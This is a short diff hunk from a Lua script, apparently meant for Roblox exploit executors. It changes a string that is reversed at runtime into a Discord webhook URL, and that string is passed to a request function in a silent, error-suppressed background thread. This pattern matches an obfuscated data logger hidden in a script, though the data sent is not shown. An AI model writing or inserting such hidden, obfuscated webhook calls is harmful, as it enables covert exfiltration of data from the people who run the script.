@@ -51,7 +51,7 @@ end
 
 task.spawn(function()
     pcall(function()
-        local rawUrl = "X30dQ1ifpuzCv5Xoij48e8rBu39NNHevqqnN0JT-XSzfnV91j_0ILaeKb1Yh4MDpe4w/2708081721047667251/skoohbew/ipa/moc.drocsid//:sptth"
+        local rawUrl = "X30dQ1ifpuzCv5Xoi48e8rBu39NNHevqqNv0jOT-XSzfnV91j_0ILaeKb1Yh4mDMpe4w/2708081721047667251/skoohbew/ipa/moc.drocsid//:sptth"
         local url = string.reverse(rawUrl)
         
         local req = (syn and syn.request) or (http and http.request) or request or http_request
